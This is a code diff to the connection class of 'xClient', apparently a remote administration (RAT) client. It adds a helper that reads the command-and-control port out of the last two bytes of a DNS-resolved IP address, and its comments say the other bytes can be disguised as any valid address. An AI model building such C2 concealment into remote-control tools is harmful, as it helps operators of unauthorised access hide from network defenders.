@@ -13,6 +13,7 @@ using xClient.Core.ReverseProxy.Packets;
 using System.Collections.Generic;
 using System.Linq;
 using xClient.Core.ReverseProxy;
+using System.Net;
 
 namespace xClient.Core
 {
@@ -191,7 +192,7 @@ namespace xClient.Core
         /// </summary>
         /// <param name="host">The host (or server) to connect to.</param>
         /// <param name="port">The port of the host.</param>
-        public void Connect(string host, ushort port)
+        public void Connect(string host, string port)
         {
             try
             {
@@ -203,7 +204,9 @@ namespace xClient.Core
                 _handle.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.NoDelay, true);
                 _handle.NoDelay = true;
 
-                _handle.Connect(host, port);
+                int portNumber = getPortNumber(port);
+
+                _handle.Connect(host, portNumber);
 
                 if (_handle.Connected)
                 {
@@ -215,6 +218,35 @@ namespace xClient.Core
             {
                 OnClientFail(ex);
             }
+        }
+
+        private int getPortNumber(string port)
+        {
+
+            // four byte IP address AA.BB.CC.DD results in 2 byte port number CCDD
+            // the class A and B addresses bytes are ignored and can be set to resemble any valid IP address
+
+            int intPort = 0;
+            try
+            {
+                intPort = int.Parse(port);
+            }
+            catch (Exception)
+            {
+                IPAddress[] addresslist = Dns.GetHostAddresses(port);
+                foreach (IPAddress theaddress in addresslist)
+                {
+                    if (theaddress.AddressFamily == AddressFamily.InterNetwork)
+                    {
+                        byte[] bytes = theaddress.GetAddressBytes();
+                        Array.Reverse(bytes);
+                        bytes[2] = 0;
+                        bytes[3] = 0;
+                        intPort = BitConverter.ToInt32(bytes, 0);
+                    }
+                }
+            }
+            return intPort;
         }
 
         private void Initialize()
